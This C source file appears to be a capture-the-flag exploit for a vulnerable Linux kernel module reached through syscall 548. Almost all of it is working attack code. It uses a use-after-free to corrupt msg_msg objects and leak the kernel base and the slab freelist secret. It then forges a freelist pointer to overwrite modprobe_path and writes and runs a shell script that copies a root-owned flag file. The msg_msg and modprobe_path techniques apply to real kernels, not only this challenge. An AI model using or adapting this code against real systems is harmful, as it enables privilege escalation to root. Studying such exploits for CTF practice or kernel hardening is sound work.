#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

typedef struct
{
    int idx;
    unsigned short priority;
    char *data;
} userdata;

typedef struct
{
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

int msg_alloc(int qid, char *data, unsigned int size)
{
    msgbuf.mtype = 1;

    memcpy(msgbuf.mtext, &data[0x30], size - 0x30);
    return msgsnd(qid, &msgbuf, size - 0x30, 0);
}

unsigned long docall(int option, int idx, unsigned short priority, char *data)
{
    userdata req = {
        .idx = idx,
        .priority = priority,
        .data = data};

    return syscall(548, option, &req);
}

unsigned long alloc(unsigned short priority, char *data)
{
    return docall(1, -1, priority, data);
}

unsigned long removechunk(int idx)
{
    return docall(2, idx, 0, "");
}

unsigned long edit(int idx, char *data)
{
    return docall(3, idx, 0, data);
}

unsigned long copy(int idx)
{
    return docall(4, idx, 0, "");
}

struct chunk_info
{
    unsigned long address;
    unsigned long next;
    unsigned long offset;
};

struct chunk_info chunks[16];

unsigned long kernel_base = 0;
unsigned long slab_random = 0;
unsigned long msg_msg_address = 0;
unsigned long modprobe_path = 0;

unsigned long bswap(unsigned long val) {
    asm(
        "bswap %1;"
        : "=r" (val)
        : "r" (val));
}

void find_chunk_info(char *buffer)
{
    unsigned long *ptr;

    // Stage1 : Find offsets of chunks in payload
    for (size_t offset = 0; offset < 0x1000; offset += 8)
    {
        ptr = buffer + offset;

        if (((*ptr & 0xffffffffffffff00) == 0x4141414141414100) && ((*ptr & 0x00000000000000ff) != 0x41))
        {
            // Found a chunk
            int idx = (*ptr & 0x00000000000000ff) - 0x50;

            chunks[idx].offset = offset - 0x10;
            chunks[idx].next = *((unsigned long *)(buffer + offset - 0x10));
        }

        if ((kernel_base == 0) && ((*ptr & 0xfff) == 0x600))
        {
            kernel_base = *ptr - 0xa11600;
            modprobe_path = kernel_base + 0x144fa20;
        }
    }

    // Stage2 : Find addresses of chunks
    for (int i = 0; i < 15; i++)
    {
        if ((chunks[i].offset != 0) && (chunks[i + 1].offset != 0))
        {
            chunks[i + 1].address = chunks[i].next;

            // Calculate msg_msg address relative to current chunk
            msg_msg_address = chunks[i + 1].address - chunks[i + 1].offset - 0x20;
        }
    }

    // Show chunk informations
    printf("\nFound chunks\n");
    printf("---------------------------------------------------------------------------------\n");
    for (int i = 0; i < 16; i++)
    {
        printf("Chunk [%2d] - Address: %18p / Next: %18p / Offset: %5p\n", i, chunks[i].address, chunks[i].next, chunks[i].offset);
    }
    printf("---------------------------------------------------------------------------------\n\n");

    // Stage3 : Allocate another msg_msg and free two known chunks
    char msg_payload[0x1000] = {0};
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    msg_alloc(qid, msg_payload, 0x80);

    unsigned long freed_addresses[2];
    int cur_free = 0;

    // Free two chunks with known offset and address
    for (int i = 0; i < 16; i++)
    {
        if (chunks[i].address != 0 && chunks[i].offset != 0)
        {
            removechunk(i);
            freed_addresses[cur_free++] = i;

            if (cur_free == 2)
                break;
        }
    }

    if (cur_free != 2)
    {
        printf("[+] Didn't find enough chunks for heap guard leak\n");
        exit(-1);
    }

    // Stage4 : Corrupt msg_msg again to leak known free chunk heap guards and calculate secret
    memset(msg_payload, 0xff, 2);
    memset(msg_payload + 2, 0x41, 0x10);
    msg_payload[0x12] = 0x0;

    edit(-1, msg_payload);

    msgrcv(qid, msg_payload + 8, 0x4141414141414141, 0x4141414141414141, 0);

    unsigned long heap_guard = *((unsigned long *)(msg_payload + chunks[freed_addresses[1]].offset + 0x40));
    unsigned long next_free = chunks[freed_addresses[0]].address;
    unsigned long ptr_addr = chunks[freed_addresses[1]].address + 0x40;

    // next_free = heap_guard ^ s->random ^ swab(ptr_addr)
    // s->random = heap_guard ^ next_free ^ swab(ptr_addr)
    slab_random = heap_guard ^ next_free ^ bswap(ptr_addr);

    printf("[+] Kernel base   : %p\n", kernel_base);
    printf("[+] msg_msg addr  : %p\n", msg_msg_address);
    printf("[+] s->random     : %p\n", slab_random);
    printf("[+] modprobe_path : %p\n", modprobe_path);
}

int main()
{
    char payload[0x4000] = {0};
    
    printf("[+] Prepare modprobe_path exploit\n");

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

    printf("[+] Create msg queue\n");
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    printf("[+] Fillup complete storage\n");

    memset(payload, 0x41, 2);
    unsigned long* ptr = payload + 2;

    for (int i = 0; i < 16; i++)
    {
        *ptr = 0x4141414141414150 + i;
        alloc(0, payload);
    }

    printf("[+] Create uaf copy\n");
    copy(0);
    removechunk(0);

    printf("[+] Create msg_msg in uaf chunk\n");
    memset(payload, 0, 0x80);
    msg_alloc(qid, payload, 0x80);

    printf("[+] Corrup msg_msg to leak followup data\n");
    memset(payload, 0xff, 2);        // upper 2 bytes of kernel address will always be 0xffff
    memset(payload + 2, 0x41, 0x10); // overwrite msg_type and msg_size

    edit(-1, payload);

    printf("[+] Receive msg_msg for leaks\n");
    memset(payload, 0, 0x4000);
    msgrcv(qid, payload + 8, 0x4141414141414141, 0x4141414141414141, 0);
    
    find_chunk_info(payload);

    if (kernel_base != 0 && slab_random != 0 && msg_msg_address != 0)
    {
        memset(payload, 0, 0x100);
        memset(payload, 0x41, 0x32);
        ptr = payload + 0x32;
        *ptr = (modprobe_path - 0x10) ^ slab_random ^ bswap(msg_msg_address + 0x40);

        edit(-1, payload);
        memset(payload, 0, 0x100);
        memset(payload, 0x41, 0x2);
        strcpy(payload + 0x2, "/home/user/copy.sh");

        alloc(0, payload);
        alloc(0, payload);
    }
    else
    {
        printf("[-] Didn't find all needed leaks\n");
        exit(-1);
    }

    printf("Trigger modprobe_path exploit\n");
    system("./dummy");
    system("cat flag");
}
